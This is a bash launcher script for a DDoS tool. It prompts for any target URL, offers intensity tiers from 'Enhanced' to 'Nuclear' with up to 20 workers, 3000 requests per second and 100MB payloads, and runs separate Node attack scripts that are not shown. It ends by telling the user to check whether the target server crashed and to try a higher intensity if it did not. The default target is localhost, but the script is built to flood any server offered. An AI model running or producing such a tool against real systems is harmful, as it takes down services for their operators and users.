#!/bin/bash

# Ultra Extreme DDoS Attack Launcher for High-Memory Ubuntu Servers
# This script helps you easily launch the most powerful attack

echo "╔═══════════════════════════════════════════════════════════╗"
echo "║    ULTRA EXTREME DDoS ATTACK - HIGH RAM SERVER MODE       ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

# Get target URL
read -p "Enter target URL (default: http://127.0.0.1:3000): " TARGET
TARGET=${TARGET:-http://127.0.0.1:3000}

# Ask for attack intensity
echo ""
echo "Select Attack Intensity:"
echo "  1) Enhanced Attack (50MB payloads, 12 workers) - Good for 4GB RAM"
echo "  2) Extreme Attack (50MB payloads, 16 workers) - Good for 8GB RAM"  
echo "  3) Ultra Extreme Attack (50MB payloads, 20 workers) - Best for 8GB+ RAM"
echo "  4) Nuclear Attack (100MB payloads, 20 workers) - For 16GB+ RAM servers"
echo "  5) Custom Attack (you specify parameters)"
echo ""
read -p "Choose [1-5]: " CHOICE

case $CHOICE in
    1)
        echo ""
        echo "🚀 Launching Enhanced Attack..."
        echo "   Workers: 12 | RPS: 1000 | Payload: 50MB"
        echo ""
        TARGET_URL=$TARGET node ddos_attack.js
        ;;
    2)
        echo ""
        echo "🚀 Launching Extreme Attack..."
        echo "   Workers: 16 | RPS: 1600 | Payload: 50MB"
        echo ""
        TARGET_URL=$TARGET node extreme_ddos_attack.js
        ;;
    3)
        echo ""
        echo "🚀 Launching Ultra Extreme Attack..."
        echo "   Workers: 20 | RPS: 3000 | Payload: 50MB"
        echo ""
        TARGET_URL=$TARGET node ultra_extreme_attack.js
        ;;
    4)
        echo ""
        echo "🚀 Launching Nuclear Attack..."
        echo "   Workers: 20 | RPS: 3000 | Payload: 100MB"
        echo "   ⚠️  WARNING: This will generate MASSIVE network traffic!"
        echo ""
        read -p "Are you sure? (yes/no): " CONFIRM
        if [ "$CONFIRM" = "yes" ]; then
            TARGET_URL=$TARGET PAYLOAD_SIZE_MB=100 node ultra_extreme_attack.js
        else
            echo "Attack cancelled."
            exit 0
        fi
        ;;
    5)
        echo ""
        echo "Custom Attack Configuration:"
        read -p "Payload size in MB (default: 50): " PAYLOAD
        PAYLOAD=${PAYLOAD:-50}
        
        echo ""
        echo "🚀 Launching Custom Attack..."
        echo "   Payload: ${PAYLOAD}MB"
        echo ""
        TARGET_URL=$TARGET PAYLOAD_SIZE_MB=$PAYLOAD node ultra_extreme_attack.js
        ;;
    *)
        echo "Invalid choice. Exiting."
        exit 1
        ;;
esac

echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║                    ATTACK COMPLETED                       ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "Check the target server to see if it crashed!"
echo "If still running, try a higher intensity attack."
